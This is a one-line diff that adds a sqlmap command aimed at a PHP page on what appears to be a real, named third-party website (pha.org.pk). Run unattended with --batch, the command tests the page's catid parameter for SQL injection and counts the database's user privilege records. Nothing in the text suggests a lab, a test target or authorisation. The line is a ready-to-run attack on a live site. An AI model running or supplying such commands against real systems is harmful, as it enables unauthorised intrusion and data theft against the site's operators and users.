@@ -1,0 +1,1 @@
+python3 sqlmap.py -u "http://www.pha.org.pk/sro_list.php?catid=1"   --batch   --count -D information_schema  -T USER_PRIVILEGES
